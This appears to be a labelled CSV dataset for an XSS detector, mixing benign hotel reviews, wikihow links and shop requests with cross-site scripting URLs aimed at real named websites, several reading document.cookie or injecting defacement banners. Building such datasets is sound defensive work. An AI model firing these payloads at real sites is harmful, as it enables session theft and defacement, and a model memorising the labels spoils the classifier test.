Payloads,Class,decoded,executed,parser_changed
http://www.wikihow.com/make-a-banana-sweet-treat&t=1396515696877&n=208065&k=mainentity,Benign,http://www.wikihow.com/make-a-banana-sweet-treat&t=1396515696877&n=208065&k=mainentity,False,False
http://mapserver3.ldpassociati.it/siena/portale/gloss_norm/glossario.cfm?cod_cla=2&amp;cod_sottocla=1&amp;de<br>scri_sottocla=%3e%22%3e%3cscript%3ealert(%22xss%22)%3c/script%3e,Malicious,"http://mapserver3.ldpassociati.it/siena/portale/gloss_norm/glossario.cfm?cod_cla=2&cod_sottocla=1&descri_sottocla=>""><script>alert(""xss"")</script>",True,True
"week of pure heaven we stayed a week at the royal palms and had a simply amazing experience. the resort is very unique with stunning grounds and suprises at every turn. beautiful outdoor public areas and very interesting historical furniture throughout.jose at the pool is simply the best! this dude more than took care of us throughout the stay (even if his wrist was having some issues). quite frankly, i would return for the pool service alone.we stayed in a casita which was awesome. great little patio area that was perfect for reading the paper and enjoying a wake-up beverage in the morning. bed very comforable and furnishings made you feel you were someplace special.really enjoyed the t. cooke's sunday brunch. other meals there were also very good. the bar is a great relaxing scene.what sets this place apart is the service. you never feel like you are a bother and they really do anticipate your needs.can't wait to visit again.",Benign,"week of pure heaven we stayed a week at the royal palms and had a simply amazing experience. the resort is very unique with stunning grounds and suprises at every turn. beautiful outdoor public areas and very interesting historical furniture throughout.jose at the pool is simply the best! this dude more than took care of us throughout the stay (even if his wrist was having some issues). quite frankly, i would return for the pool service alone.we stayed in a casita which was awesome. great little patio area that was perfect for reading the paper and enjoying a wake-up beverage in the morning. bed very comforable and furnishings made you feel you were someplace special.really enjoyed the t. cooke's sunday brunch. other meals there were also very good. the bar is a great relaxing scene.what sets this place apart is the service. you never feel like you are a bother and they really do anticipate your needs.can't wait to visit again.",False,False
http://az.gov/webapp/portal/searchservlet?restrict=&amp;q=&quot;&gt;&lt;script&gt;alert('xss')&lt;/script&gt;,Malicious,"http://az.gov/webapp/portal/searchservlet?restrict=&q=""><script>alert('xss')</script>",True,True
insertar&precio=3991&b1=confirmar,Benign,insertar&precio=3991&b1=confirmar,False,False
http://help.travian.com.pt/index.php?type=%22%3e%3c/script%3e%3cscript%3ealert(/xssed_by_nemesis/);a<br>lert(document.cookie);%3c/script%3e,Malicious,"http://help.travian.com.pt/index.php?type=""></script><script>alert(/xssed_by_nemesis/);alert(document.cookie);</script>",True,True
"fantastic hotel fantastic choice, 10 days at the tuscan, location is wonderful only a couple of blocks from pier 39. the coffee and biscotti in the morning were a nice touch, and the wine tasting every evening became a must get back to the hotel for. room spacious 2 double beds gave us plenty of room, the beds were comfortable and the bathroom was a good size. there is a bar up the road if you are a sports fan at the grand hyatt which is worth a visit. overall a fantastic time was had there and i look forward to returning a+++++++++++++",Benign,"fantastic hotel fantastic choice, 10 days at the tuscan, location is wonderful only a couple of blocks from pier 39. the coffee and biscotti in the morning were a nice touch, and the wine tasting every evening became a must get back to the hotel for. room spacious 2 double beds gave us plenty of room, the beds were comfortable and the bathroom was a good size. there is a bar up the road if you are a sports fan at the grand hyatt which is worth a visit. overall a fantastic time was had there and i look forward to returning a             ",False,False
http://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=isabell7&pwd=ca6eado&remember=on&b1=entrar,Benign,http://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=isabell7&pwd=ca6eado&remember=on&b1=entrar,False,False
http://www.albnaa.com/vbzoom/index.php?userid=&quot;;&gt;&lt;script&gt;alert(1);&lt;/script&gt;,Malicious,"http://www.albnaa.com/vbzoom/index.php?userid="";><script>alert(1);</script>",True,True
"our clothes were stolen we stayed in the hotel royal and got a room in the attic - very oddly designed and quite a walk up. one day we got stuck in a typical new orleans downpour and we left our clothes to dry in the bathroom. when we got back to our room, not only were those clothes missing , but other accessories had been taken from the bathroom - a belt, tie, bath products. and the front desk staff didn't do a thing about it. i would never stay here ever again.",Benign,"our clothes were stolen we stayed in the hotel royal and got a room in the attic - very oddly designed and quite a walk up. one day we got stuck in a typical new orleans downpour and we left our clothes to dry in the bathroom. when we got back to our room, not only were those clothes missing , but other accessories had been taken from the bathroom - a belt, tie, bath products. and the front desk staff didn't do a thing about it. i would never stay here ever again.",False,False
http://www.realtimeworlds.com/index.php?id=4&amp;pid=4&amp;nid=%3cscript%3ealert(document.cookie);%3c/script<br>%3e,Malicious,http://www.realtimeworlds.com/index.php?id=4&pid=4&nid=<script>alert(document.cookie);</script>,True,True
http://www.fossilien24.ch/index.php?page=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&gt;&lt;marquee&gt;&lt;h1&gt;back<br>door&lt;/h1&gt;&lt;/marquee&gt;,Malicious,"http://www.fossilien24.ch/index.php?page=""><script>alert(document.cookie)</script>><marquee><h1>backdoor</h1></marquee>",True,True
http://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=bertini&password=santal%e1cea&nombre=berta&apellidos=gherra+bars&email=triesault%40hiperbilbao.ir&dni=85225690h&direccion=c%2f+general+benavides%2c+199%2c+9%3fh&ciudad=tamarite+de+litera&cp=50491&provincia=tarragona&ntc=2806369536513232&b1=registrar,Benign,"http://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=bertini&password=santal�cea&nombre=berta&apellidos=gherra bars&email=triesault@hiperbilbao.ir&dni=85225690h&direccion=c/ general benavides, 199, 9?h&ciudad=tamarite de litera&cp=50491&provincia=tarragona&ntc=2806369536513232&b1=registrar",False,False
http://www.wikihow.com/make-nonalcoholic-drinks-(recipes)&t=1396545835526&n=1664764&k=mainentity,Benign,http://www.wikihow.com/make-nonalcoholic-drinks-(recipes)&t=1396545835526&n=1664764&k=mainentity,False,False
http://www.wikihow.com/search-for-a-product-at-amazon&t=1396629493689&n=5421121&k=mainentity,Benign,http://www.wikihow.com/search-for-a-product-at-amazon&t=1396629493689&n=5421121&k=mainentity,False,False
http://www.wikihow.com/choose-a-horse-for-therapeutic-riding&t=1396526802761&n=801920&k=mainentity,Benign,http://www.wikihow.com/choose-a-horse-for-therapeutic-riding&t=1396526802761&n=801920&k=mainentity,False,False
"clean, very accessible and friendly staff i spent a week there from dec 22nd and enjoyed the experience tremendously. would definitely stay there again.",Benign,"clean, very accessible and friendly staff i spent a week there from dec 22nd and enjoyed the experience tremendously. would definitely stay there again.",False,False
http://www.54ab.com/company.asp?id=1&amp;name=%3cscript%3ealert(/st@r-gaz3r/)%3c/script%3e%3cmarquee%3e%<br>3ch1%3est@r-gaz3r%3c/h1%3e%3c/marquee%3e,Malicious,http://www.54ab.com/company.asp?id=1&name=<script>alert(/st@r-gaz3r/)</script><marquee><h1>st@r-gaz3r</h1></marquee>,True,True
http://localhost:8080/tienda1/publico/anadir.jsp?id=3&nombre=vino+rioja&precio=100&cantidad=48&b1=a%f1adir+al+carrito,Benign,http://localhost:8080/tienda1/publico/anadir.jsp?id=3&nombre=vino rioja&precio=100&cantidad=48&b1=a�adir al carrito,False,False
http://www.wikihow.com/make-dr.-pepper&t=1396545743400&n=1658516&k=mainentity,Benign,http://www.wikihow.com/make-dr.-pepper&t=1396545743400&n=1658516&k=mainentity,False,False
"Not Horrible, Not Great The review which was just posted was very detailed and accurately described our experience as well. Accordingly, will just say that we agree with all that has been said - good and bad - that is the problem, inconsistency. We have stayed at 10 other AI resorts in other countries - this was the first one in the Dominican. Would we go back? Probably not. Was it horrible? No, we can have a good time wherever we go. Some things were wonderful, some just really not great.We rely on Trip Advisor heavily so just want to paint an accurate view of the resort so you can make a knowledgable decision. If you already booked, no worries, you will have a great time. If you are considering booking this resort, I would read this review, and some of the others carefully - in the end, the price was very cheap (probably b/c it just opened) and if you are looking for a good value, have a lot of patience, and can overlook the inconsistency, you will have a great time.Overall, we arrived at main lobby and it was a bit of a circus atmosphere -enjoyed arriving at the Ambar lobby - much more se",Benign,"Not Horrible, Not Great The review which was just posted was very detailed and accurately described our experience as well. Accordingly, will just say that we agree with all that has been said - good and bad - that is the problem, inconsistency. We have stayed at 10 other AI resorts in other countries - this was the first one in the Dominican. Would we go back? Probably not. Was it horrible? No, we can have a good time wherever we go. Some things were wonderful, some just really not great.We rely on Trip Advisor heavily so just want to paint an accurate view of the resort so you can make a knowledgable decision. If you already booked, no worries, you will have a great time. If you are considering booking this resort, I would read this review, and some of the others carefully - in the end, the price was very cheap (probably b/c it just opened) and if you are looking for a good value, have a lot of patience, and can overlook the inconsistency, you will have a great time.Overall, we arrived at main lobby and it was a bit of a circus atmosphere -enjoyed arriving at the Ambar lobby - much more se",False,False
http://www.ofngallery.com/gallery4/igallery.asp?d=&quot;&gt;&lt;script&gt;alert('xss')&lt;/script&gt;&gt;&lt;marquee&gt;&lt;h1&gt;by+na<br>rcoticxs&lt;/h1&gt;&lt;/marquee&gt;,Malicious,"http://www.ofngallery.com/gallery4/igallery.asp?d=""><script>alert('xss')</script>><marquee><h1>by narcoticxs</h1></marquee>",True,True
http://www.wikihow.com/clean-and-organize-a-dvd-shelf&t=1396563068147&n=2590552&k=mainentity,Benign,http://www.wikihow.com/clean-and-organize-a-dvd-shelf&t=1396563068147&n=2590552&k=mainentity,False,False
"great value and great staff! very nice hotel, very friendly staff, great value for money $99 per night! minutes walk from the glitz and glamour of rodeo drive other bevely hills attractions, 5 mins drive from the strip! what more can you ask for?",Benign,"great value and great staff! very nice hotel, very friendly staff, great value for money $99 per night! minutes walk from the glitz and glamour of rodeo drive other bevely hills attractions, 5 mins drive from the strip! what more can you ask for?",False,False
http://www.turismobrasil.gov.br/system/modules/br.gov.turismo.promocional/templates/geral/geral_resu<br>&lt;script&gt;alert(document.cookie);&lt;/script&gt;ltado_busca.jsp,Malicious,http://www.turismobrasil.gov.br/system/modules/br.gov.turismo.promocional/templates/geral/geral_resu<script>alert(document.cookie);</script>ltado_busca.jsp,True,True
"great everything we stayed at this hotel the first weekend in aug. and enjoyed it very much. this is not a luxury hotel, it's more like your apartment in nyc. we had a 2 bedroom apt. on the 6th floor. very clean and lots of room. it felt very much like home. the beds were fine, the bathroom was large and the living room was very comfortable. the location was excellent, very convienent to most midtown attractions and a short cab ride to everything else. i have no complaints about this place and would recommend it to anyone. i read a few reviews from people that were complaining of the city noise. if you don't want city noise, stay out of the city. your going to get that at any hotel in the city, duh!!! all in all it was a great place for a very reasonable price for 4 people in nyc.",Benign,"great everything we stayed at this hotel the first weekend in aug. and enjoyed it very much. this is not a luxury hotel, it's more like your apartment in nyc. we had a 2 bedroom apt. on the 6th floor. very clean and lots of room. it felt very much like home. the beds were fine, the bathroom was large and the living room was very comfortable. the location was excellent, very convienent to most midtown attractions and a short cab ride to everything else. i have no complaints about this place and would recommend it to anyone. i read a few reviews from people that were complaining of the city noise. if you don't want city noise, stay out of the city. your going to get that at any hotel in the city, duh!!! all in all it was a great place for a very reasonable price for 4 people in nyc.",False,False
http://www.wikihow.com/make-a-nutella-banana-dessert&t=1396515715076&n=209341&k=mainentity,Benign,http://www.wikihow.com/make-a-nutella-banana-dessert&t=1396515715076&n=209341&k=mainentity,False,False
http://www.street-directory.com/ntu/campus.cgi?x=&quot;&gt;&lt;script&gt;alert(&quot;maxwel&quot;)&lt;/script&gt;,Malicious,"http://www.street-directory.com/ntu/campus.cgi?x=""><script>alert(""maxwel"")</script>",True,True
http://rock.geosociety.org/directory/alpha.asp?section=&quot;&gt;&lt;script&gt;alert(&quot;maxwel&quot;)&lt;/script&gt;,Malicious,"http://rock.geosociety.org/directory/alpha.asp?section=""><script>alert(""maxwel"")</script>",True,True
http://rapidfox.net/search.php?q=%22%3e%3ch1%3eby%20st@rext%3c/h1%3e%3cscript%3ealert(document.cooki<br>e)%3c/script%3e%20%3cscript%3ealert('by%20st@rext')%3c/script%3e,Malicious,"http://rapidfox.net/search.php?q=""><h1>by st@rext</h1><script>alert(document.cookie)</script> <script>alert('by st@rext')</script>",True,True
http://es.u21fantasy.uefa.com/m/dreamteam.mc?event=0&view=graphical&id=2%3e%22%3e%3cscript%20%0a%0d%3ealert(%27xss%20by%20turkpower%20-%20from%20turkey%20-%20hello%20uefa%20:d%27)%3b%3c/script%3e%3ch1%3exss%20by%20turkpower%20-%20from%20turkey%20-%20hello%20uefa%20%20:d%3c/h1%3e%3c/marquee%3e,Malicious,"http://es.u21fantasy.uefa.com/m/dreamteam.mc?event=0&view=graphical&id=2>""><script 
>alert('xss by turkpower - from turkey - hello uefa :d');</script><h1>xss by turkpower - from turkey - hello uefa  :d</h1></marquee>",True,True
"very nice with convenient location very nice and clean room. our internet connection was spotty - worked sometimes and other times it didn't.other than that, everything was fine. walked to nearby restaurants.would recommend this hotel.",Benign,"very nice with convenient location very nice and clean room. our internet connection was spotty - worked sometimes and other times it didn't.other than that, everything was fine. walked to nearby restaurants.would recommend this hotel.",False,False
"loved the ambience we wanted to stay in a hotel that had some character this hotel oozes glamour and is very elegant. we were not disappointed with our choice. we did book a supieror room and on checking in found the reception and bell staff very friendly and helpful. we were upgraded to a poolside cabana room and we accepted even though we were fully aware of the reviews mentioning the noise problem from tropicana bar. we found the music was louder during the day then late at night, however we were at the tropicana bar until 12.30am anyway. i have read alot of the comments that the hotel is dark this is true however i found it to be in keeping with the hotels atmosphere and creates the elegant ambience expecially in the main lobby and bar areas. we had pre dinner drinks in teddys/library bar great atmosphere and dined in dakota for dinner the service and food was great. the hotel is very central to everything in hollywood and there was even a movie premier across the road. you will also find that most of the tour groups leave from the kodak theatre across the road. the only down side was that the concierge didn't book our airport shuttle after she said she would and we were lucky enough to get one at the last minute (1 hour before we had be picked up).",Benign,"loved the ambience we wanted to stay in a hotel that had some character this hotel oozes glamour and is very elegant. we were not disappointed with our choice. we did book a supieror room and on checking in found the reception and bell staff very friendly and helpful. we were upgraded to a poolside cabana room and we accepted even though we were fully aware of the reviews mentioning the noise problem from tropicana bar. we found the music was louder during the day then late at night, however we were at the tropicana bar until 12.30am anyway. i have read alot of the comments that the hotel is dark this is true however i found it to be in keeping with the hotels atmosphere and creates the elegant ambience expecially in the main lobby and bar areas. we had pre dinner drinks in teddys/library bar great atmosphere and dined in dakota for dinner the service and food was great. the hotel is very central to everything in hollywood and there was even a movie premier across the road. you will also find that most of the tour groups leave from the kodak theatre across the road. the only down side was that the concierge didn't book our airport shuttle after she said she would and we were lucky enough to get one at the last minute (1 hour before we had be picked up).",False,False
"great location for universal - would stay again we spent two nights at the hilton universal city and thought it was the right choice for our family of four. we spent our first day touring universal studios (which was only 5 minutes away by foot or shuttle) and then had dinner in the hollywood and highland mall which is only 10 minutes away. so basically it was a very convenient spot.our check in went smoothly and our room, on the executive floor, looked like it had been recently updated. nice size although i think it was one of the smallest on the floor. we had a large, marble bathroom but no extra sink outside (as i understand other rooms have). good wifi service for my husband.we had booked the executive floor on the hilton website for an additional $30 per day. i figured it would save us on time and $$ at the hotel restaurant for breakfast. that was true except that the hotel failed to inform us in advance that they were renovating the executive floors and that the lounge had been moved to a very unattractive, windowless, function room on the 4th floor. i had hoped to be able to pop over for coffee, bagels, etc. while leaving my kids in the room. this wasn't possible with the 4th floor location. i also thought that the staff in the executive lounge was not overly friendly and seemed more like waitresses than concierges. i didn't even bother to ask them for restaurant suggestions because they seemed timid. the breakfast buffet itself was as i expected--muffins, cold cereal, bagels, pastries, fruit, coffee and juices. hopefully the new space will be finished soon as the temporary space is really a downer.we liked the pool area (saw no algae or mold) and the availability of drinks there after a day of touring universal. while we didn't eat in the hotel, the seafood buffet ($39.95 for adults) looked extensive and well-attended.i would chose the hilton again and recommend it to you. just realize that it's not perfect (they never vacuumed the elevator area carpet during our stay there) but for $180 per night including breakfast for four it was a good deal for la.",Benign,"great location for universal - would stay again we spent two nights at the hilton universal city and thought it was the right choice for our family of four. we spent our first day touring universal studios (which was only 5 minutes away by foot or shuttle) and then had dinner in the hollywood and highland mall which is only 10 minutes away. so basically it was a very convenient spot.our check in went smoothly and our room, on the executive floor, looked like it had been recently updated. nice size although i think it was one of the smallest on the floor. we had a large, marble bathroom but no extra sink outside (as i understand other rooms have). good wifi service for my husband.we had booked the executive floor on the hilton website for an additional $30 per day. i figured it would save us on time and $$ at the hotel restaurant for breakfast. that was true except that the hotel failed to inform us in advance that they were renovating the executive floors and that the lounge had been moved to a very unattractive, windowless, function room on the 4th floor. i had hoped to be able to pop over for coffee, bagels, etc. while leaving my kids in the room. this wasn't possible with the 4th floor location. i also thought that the staff in the executive lounge was not overly friendly and seemed more like waitresses than concierges. i didn't even bother to ask them for restaurant suggestions because they seemed timid. the breakfast buffet itself was as i expected--muffins, cold cereal, bagels, pastries, fruit, coffee and juices. hopefully the new space will be finished soon as the temporary space is really a downer.we liked the pool area (saw no algae or mold) and the availability of drinks there after a day of touring universal. while we didn't eat in the hotel, the seafood buffet ($39.95 for adults) looked extensive and well-attended.i would chose the hilton again and recommend it to you. just realize that it's not perfect (they never vacuumed the elevator area carpet during our stay there) but for $180 per night including breakfast for four it was a good deal for la.",False,False
http://www.wikihow.com/make-furniture-for-your-american-girl-doll&t=1396562744705&n=2569660&k=mainentity,Benign,http://www.wikihow.com/make-furniture-for-your-american-girl-doll&t=1396562744705&n=2569660&k=mainentity,False,False
http://www.wikihow.com/make-a-cheese-free-cheesecake&t=1396517026399&n=285489&k=mainentity,Benign,http://www.wikihow.com/make-a-cheese-free-cheesecake&t=1396517026399&n=285489&k=mainentity,False,False
http://www.wikihow.com/unmark-an-email-as-spam-in-aol&t=1396532256539&n=1057610&k=mainentity,Benign,http://www.wikihow.com/unmark-an-email-as-spam-in-aol&t=1396532256539&n=1057610&k=mainentity,False,False
http://turkcell-imbenim.turkcell.com.tr/search.aspx?q=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&gt;&lt;mar<br>quee&gt;&lt;h1&gt;backdoor&lt;/h1&gt;&lt;/marquee&gt;,Malicious,"http://turkcell-imbenim.turkcell.com.tr/search.aspx?q=""><script>alert(document.cookie)</script>><marquee><h1>backdoor</h1></marquee>",True,True
http://www.wikihow.com/be-a-camper-in-call-of-duty-4&t=1396649201723&n=5993259&k=mainentity,Benign,http://www.wikihow.com/be-a-camper-in-call-of-duty-4&t=1396649201723&n=5993259&k=mainentity,False,False
http://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=7622&b1=pasar+por+caja,Benign,http://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=7622&b1=pasar por caja,False,False
http://www.wikihow.com/expose-the-illuminati&t=1396569748335&n=2918345&k=mainentity,Benign,http://www.wikihow.com/expose-the-illuminati&t=1396569748335&n=2918345&k=mainentity,False,False
http://lindanyl.zwembadwereld.nl/index.php?action=search&amp;item=content&amp;blog=%3e%22%3e%3cscript%20%0a%<br>0d%3ealert(document.cookie)%3b%3c/script%3e,Malicious,"http://lindanyl.zwembadwereld.nl/index.php?action=search&item=content&blog=>""><script 
>alert(document.cookie);</script>",True,True
registro&login=siu-ling&password=sabanea9&nombre=cintio&apellidos=castejon+quiroga&email=cossovel-heintel%40camiones-hibridos.ec&dni=45788067n&direccion=c%2f+saturn+s%2fn+4%3fh&ciudad=sarrac%edn&cp=17121&provincia=palencia&ntc=6361616963861942&b1=registrar,Benign,registro&login=siu-ling&password=sabanea9&nombre=cintio&apellidos=castejon quiroga&email=cossovel-heintel@camiones-hibridos.ec&dni=45788067n&direccion=c/ saturn s/n 4?h&ciudad=sarrac�n&cp=17121&provincia=palencia&ntc=6361616963861942&b1=registrar,False,False
entrar&login=kaycee&pwd=ro3eral&remember=on&b1=entrar,Benign,entrar&login=kaycee&pwd=ro3eral&remember=on&b1=entrar,False,False
http://www.hack-medya.org/rss/show_webfeed.php?wccategory=0&amp;wcheadlines=&lt;script&gt;alert(document.cooki<br>e)&lt;/script&gt;,Malicious,http://www.hack-medya.org/rss/show_webfeed.php?wccategory=0&wcheadlines=<script>alert(document.cookie)</script>,True,True
http://www.developer-network.org/suggestions-feedback/?thredprefix=&quot;&gt;&lt;/a&gt;&lt;script&gt;alert(document.cook<br>ie);&lt;/script&gt;,Malicious,"http://www.developer-network.org/suggestions-feedback/?thredprefix=""></a><script>alert(document.cookie);</script>",True,True
http://www.wikihow.com/work-with-stubborn-it-engineers&t=1396612605753&n=4790267&k=mainentity,Benign,http://www.wikihow.com/work-with-stubborn-it-engineers&t=1396612605753&n=4790267&k=mainentity,False,False
http://www.wikihow.com/dress-as-a-comedian&t=1396517952243&n=352462&k=mainentity,Benign,http://www.wikihow.com/dress-as-a-comedian&t=1396517952243&n=352462&k=mainentity,False,False
http://www.dinnerandsex.com/member/online_list.php?view_mode=&quot;&gt;&lt;script&gt;alert(&quot;backdoor&quot;)&lt;/script&gt;,Malicious,"http://www.dinnerandsex.com/member/online_list.php?view_mode=""><script>alert(""backdoor"")</script>",True,True
http://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=rico&password=1er%24r0tido&nombre=madai&apellidos=clavel+idro&email=reed-erbd%40enibiza.com.tm&dni=92162042f&direccion=c%2f+domingo+pisaca+burgada%2c+28%2c+13%3fe&ciudad=alcanadre&cp=02513&provincia=cuenca&ntc=0312320266873888&b1=registrar,Benign,"http://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=rico&password=1er$r0tido&nombre=madai&apellidos=clavel idro&email=reed-erbd@enibiza.com.tm&dni=92162042f&direccion=c/ domingo pisaca burgada, 28, 13?e&ciudad=alcanadre&cp=02513&provincia=cuenca&ntc=0312320266873888&b1=registrar",False,False
http://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=698&b1=confirmar,Benign,http://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=698&b1=confirmar,False,False
poor service and terrible attitide stayed for one night only ... a saturday night. when called on saturday am after arriving in la to check about an early check in they said the reservation was cancelled. i had not cancelled the reservation and they could not tell me who at the hotel had cancelled the reservation or what day it was cancelled. fixed the sitation only to receive a chilly welcome at the front desk. the service was snooty and room service was not even picking up the phone even though there was a late night room service menu in the room. after trying for 15 minutes to get someone at the front desk or room service to pu we gave up. as mentioned by others who have reviewed you can not go to the pool area past 7pm as it is closed and is a private club. even hotel guests can not get into the bar/club. went to the pool on sunday but once again very pretentious and over rated. our jr. suite was roomy but was not overly impressed with the ammenities. not recommended and definately not a child friendly hotel.,Benign,poor service and terrible attitide stayed for one night only ... a saturday night. when called on saturday am after arriving in la to check about an early check in they said the reservation was cancelled. i had not cancelled the reservation and they could not tell me who at the hotel had cancelled the reservation or what day it was cancelled. fixed the sitation only to receive a chilly welcome at the front desk. the service was snooty and room service was not even picking up the phone even though there was a late night room service menu in the room. after trying for 15 minutes to get someone at the front desk or room service to pu we gave up. as mentioned by others who have reviewed you can not go to the pool area past 7pm as it is closed and is a private club. even hotel guests can not get into the bar/club. went to the pool on sunday but once again very pretentious and over rated. our jr. suite was roomy but was not overly impressed with the ammenities. not recommended and definately not a child friendly hotel.,False,False
http://news.naver.com/news/read.php?mode=lss2d&amp;office_id=018&amp;article_id=0000521219&amp;section_id=102&amp;se<br>ction_id2=257&amp;menu_id=&quot;&gt;&lt;script&gt;alert(1)&lt;/script&gt;,Malicious,"http://news.naver.com/news/read.php?mode=lss2d&office_id=018&article_id=0000521219§ion_id=102§ion_id2=257&menu_id=""><script>alert(1)</script>",True,True
http://www.wikihow.com/start-a-successful-youtube-channel&t=1396630156869&n=5448573&k=mainentity,Benign,http://www.wikihow.com/start-a-successful-youtube-channel&t=1396630156869&n=5448573&k=mainentity,False,False
http://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=3205&b1=pasar+por+caja,Benign,http://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=3205&b1=pasar por caja,False,False
"amazing hotel!!! the omni los angeles is an exceptional hotel with a wonderful staff! this hotel is gorgeous with wonderful accommodations and amenities and is close to everything. we traveled with our small children and the location actually worked out nice because we could get to everything quickly, yet we weren't in the middle of the la craziness. i've stayed at the four seasons in san francisco and i would say that this hotel is comparable in quality and attention to detail. they even had milk and cookies in the room for us upon our arrival. i could not say more good things about this hotel...you should definitely stay here if you are going to la!",Benign,"amazing hotel!!! the omni los angeles is an exceptional hotel with a wonderful staff! this hotel is gorgeous with wonderful accommodations and amenities and is close to everything. we traveled with our small children and the location actually worked out nice because we could get to everything quickly, yet we weren't in the middle of the la craziness. i've stayed at the four seasons in san francisco and i would say that this hotel is comparable in quality and attention to detail. they even had milk and cookies in the room for us upon our arrival. i could not say more good things about this hotel...you should definitely stay here if you are going to la!",False,False
http://www.wikihow.com/evaluate-store-credit-cards&t=1396613174969&n=4808655&k=mainentity,Benign,http://www.wikihow.com/evaluate-store-credit-cards&t=1396613174969&n=4808655&k=mainentity,False,False
http://www.manfrotto.com/search?intl_code=&amp;q=\%22%3e%3cscript%3ealert(document.cookie)%3c%2fscript%3<br>e&amp;x=14&amp;y=17&amp;t=products,Malicious,"http://www.manfrotto.com/search?intl_code=&q=\""><script>alert(document.cookie)</script>&x=14&y=17&t=products",True,True
http://www.gavrogos.gr/image_display.php?id=12&quot;&gt;&lt;script&gt;alert(/kernel_panic/)&lt;/script&gt;,Malicious,"http://www.gavrogos.gr/image_display.php?id=12""><script>alert(/kernel_panic/)</script>",True,True
"gold-plated rip-off ordinary accommodations, outrageous rates, padded bill. i seldom have such a bad experience that i'm moved to post, but be warned: unless you're willing to make 10 trips to the front desk to complain (waiting each time for the desk attendant to finish his phone call), you won't get adequate service.é¥?when i checked in, the main hotel was full so they put me in the guest house adjacent. no elevator, no valet parking, and a stale-smelling hotel room that was utterly generic in furnishings and decor.é¥?couldn't turn on the air conditioner and phoned for assistance, which never arrived.é¥?$18 fee to park your own car -- same charge as for valet parking.é¥?they charged me 9.82 for 2 phone calls: then sent the same charge again on a separate receipt.é¥?only source of refreshments is the minibar. i broke down and had a soda with a posted price of 3.50; cost on checkout 7.50.é¥?lost my receipt at airport security and spent 2 full weeks phoning the luxe for a copy. only got a return call by resorting to threats.é¥?in brief: this place has an address and a name to offer. everything else is pure attitude. a dismal disappointment.",Benign,"gold-plated rip-off ordinary accommodations, outrageous rates, padded bill. i seldom have such a bad experience that i'm moved to post, but be warned: unless you're willing to make 10 trips to the front desk to complain (waiting each time for the desk attendant to finish his phone call), you won't get adequate service.é¥?when i checked in, the main hotel was full so they put me in the guest house adjacent. no elevator, no valet parking, and a stale-smelling hotel room that was utterly generic in furnishings and decor.é¥?couldn't turn on the air conditioner and phoned for assistance, which never arrived.é¥?$18 fee to park your own car -- same charge as for valet parking.é¥?they charged me 9.82 for 2 phone calls: then sent the same charge again on a separate receipt.é¥?only source of refreshments is the minibar. i broke down and had a soda with a posted price of 3.50; cost on checkout 7.50.é¥?lost my receipt at airport security and spent 2 full weeks phoning the luxe for a copy. only got a return call by resorting to threats.é¥?in brief: this place has an address and a name to offer. everything else is pure attitude. a dismal disappointment.",False,False
http://student.km.ru/search.asp?id_subject=')%3e%3c/script%3e%3cscript%3ealert(document.cookie)%3c/s<br>cript%3e,Malicious,http://student.km.ru/search.asp?id_subject=')></script><script>alert(document.cookie)</script>,True,True
http://www.wikihow.com/play-mp3-with-mparty3&t=1396533430788&n=1112945&k=mainentity,Benign,http://www.wikihow.com/play-mp3-with-mparty3&t=1396533430788&n=1112945&k=mainentity,False,False
